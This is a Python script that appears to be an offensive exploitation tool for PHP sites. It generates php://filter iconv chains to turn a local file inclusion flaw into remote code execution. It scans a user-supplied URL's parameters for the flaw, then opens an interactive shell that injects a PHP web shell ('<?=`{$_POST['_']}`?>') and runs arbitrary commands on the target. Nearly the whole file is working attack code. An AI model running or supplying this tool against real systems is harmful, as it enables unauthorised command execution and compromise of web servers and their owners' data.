
import re
import os
import base64
import urllib
import random
import string
import requests

from rich.console import Console
from prompt_toolkit import PromptSession
from prompt_toolkit.formatted_text import HTML
from prompt_toolkit.history import InMemoryHistory

class PHPFilterChainGenerator:

    def __init__(self, url, silent=False):
        self.console = Console()
        self.url = url
        self.silent = silent
        self.file_to_use = "php://temp"
        self.string = self._generate_random_string()
        self.conversions = {
            '0': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2',
            '1': 'convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4',
            '2': 'convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921',
            '3': 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE',
            '4': 'convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE',
            '5': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2',
            '6': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.CSIBM943.UCS4|convert.iconv.IBM866.UCS-2',
            '7': 'convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4',
            '8': 'convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2',
            '9': 'convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB',
            'A': 'convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213',
            'a': 'convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE',
            'B': 'convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000',
            'b': 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE',
            'C': 'convert.iconv.UTF8.CSISO2022KR',
            'c': 'convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2',
            'D': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213',
            'd': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5',
            'E': 'convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT',
            'e': 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UTF16.EUC-JP-MS|convert.iconv.ISO-8859-1.ISO_6937',
            'F': 'convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB',
            'f': 'convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213',
            'g': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8',
            'G': 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90',
            'H': 'convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213',
            'h': 'convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE',
            'I': 'convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213',
            'i': 'convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000',
            'J': 'convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4',
            'j': 'convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16',
            'K': 'convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE',
            'k': 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2',
            'L': 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC',
            'l': 'convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE',
            'M':'convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T',
            'm':'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949',
            'N': 'convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4',
            'n': 'convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61',
            'O': 'convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775',
            'o': 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE',
            'P': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB',
            'p': 'convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4',
            'q': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.GBK.CP932|convert.iconv.BIG5.UCS2',
            'Q': 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2',
            'R': 'convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4',
            'r': 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.ISO-IR-99.UCS-2BE|convert.iconv.L4.OSF00010101',
            'S': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS',
            's': 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90',
            'T': 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103',
            't': 'convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS',
            'U': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943',
            'u': 'convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61',
            'V': 'convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB',
            'v': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.ISO-8859-14.UCS2',
            'W': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936',
            'w': 'convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE',
            'X': 'convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932',
            'x': 'convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS',
            'Y': 'convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361',
            'y': 'convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT',
            'Z': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16',
            'z': 'convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937',
            '/': 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4',
            '+': 'convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157',
            '=': ''
        }
        self.LFI_TEST_FILES = [
            (self.generate_filter_chain(f"<?php echo '{self.string}'; ?>"), re.compile(fr'{self.string}')),
        ]

    def _generate_random_string(self, length=6):
        return ''.join(random.choice(string.ascii_letters) for _ in range(length))
    
    def generate_filter_chain(self, chain):
        chain = chain.encode('utf-8')
        chain = base64.b64encode(chain).decode('utf-8').replace("=", "")
        encoded_chain = chain
        filters = "convert.iconv.UTF8.CSISO2022KR|"
        filters += "convert.base64-encode|"
        filters += "convert.iconv.UTF8.UTF7|"

        for c in encoded_chain[::-1]:
            filters += self.conversions[c] + "|"
            filters += "convert.base64-decode|"
            filters += "convert.base64-encode|"
            filters += "convert.iconv.UTF8.UTF7|"
            
        filters += "convert.base64-decode"    
        final_payload = f"php://filter/{filters}/resource={self.file_to_use}"
        return final_payload

        
    def filter_check(self):
        console = Console()
        parsed_url = urllib.parse.urlparse(self.url)
        params = urllib.parse.parse_qs(parsed_url.query)
        file_paths = self.LFI_TEST_FILES

        return self._scan(params, file_paths, parsed_url, console) 
    
    def _scan(self, params, file_paths, parsed_url, console):

        for param_name in params.keys():
            for i, (file_path, file_regex) in enumerate(file_paths):
                new_params = params.copy()
                new_params[param_name] = file_path
                new_query = urllib.parse.urlencode(new_params, doseq=True)
                fuzzed_url = urllib.parse.urlunparse(parsed_url._replace(query=new_query))
                response = requests.get(fuzzed_url, verify=False)

                match = file_regex.search(response.text)
                if match:
                    if not self.silent:
                        console.print(f'\n[bold red]Possible LFI2RCE (php_filter_chain: method)[/bold red]', style='bold red')
                    self.success_depth = i
                    self.base64_content = match.group(0)
                    return True, param_name
                
        return False, None        
                
    def shell(self, param_name):
        self.silent = True
        if not param_name:
            self.console.print("[bold red]No valid parameter name provided.[/bold red]")
            return
        
        if not self.filter_check():
            self.console.print("[bold red]LFI2RCE not detected or not exploitable.[/bold red]")
            return

        self.console.print("[bold yellow]Interactive shell is ready. Type your commands.[/bold yellow]")
        
            
        session = PromptSession(history=InMemoryHistory())        
        while True:
            try:
                cmd = session.prompt(HTML('<ansired><b># </b></ansired>'))
                cmd = f"echo [S]; {cmd};echo [E]"
            
                if "exit" in cmd:
                    raise KeyboardInterrupt
                elif not cmd:
                    continue
                elif "clear" in cmd:
                    if os.name == 'posix':
                        os.system('clear')
                elif os.name == 'nt':
                    os.system('cls')                                                             
                if cmd.lower() in ["exit", "quit"]:
                    break

                shell_code = self.generate_filter_chain("<?=`{$_POST['_']}`?>")
                parsed_url = urllib.parse.urlparse(self.url)
                params = urllib.parse.parse_qs(parsed_url.query)
                new_params = params.copy()
                new_params[param_name] = shell_code
                new_query = urllib.parse.urlencode(new_params, doseq=True)
                fuzzed_url = urllib.parse.urlunparse(parsed_url._replace(query=new_query))

                response = requests.post(fuzzed_url, data={"_": cmd})
                pattern = re.compile(r'\[S\](.*?)\[E\]', re.DOTALL) 
                response_content = pattern.search(response.text)
                if response_content:
                    shell_output = response_content.group(1)
                    self.console.print(f"[bold green]{shell_output}[/bold green]")
                else:
                    self.console.print("[bold red]No shell output.[/bold red]")
                    
            except KeyboardInterrupt:
                    self.console.print("[bold yellow][!] Exiting shell...[/bold yellow]")
                    break        
                  

def main():
    url = input('Enter site URL to test: ')
    checker = PHPFilterChainGenerator(url, silent=False)
    result, param_name = checker.filter_check()
    print(f"LFI detected: {result}")
    if result:
        checker.shell(param_name)
        
if __name__ == '__main__':
    main() 
 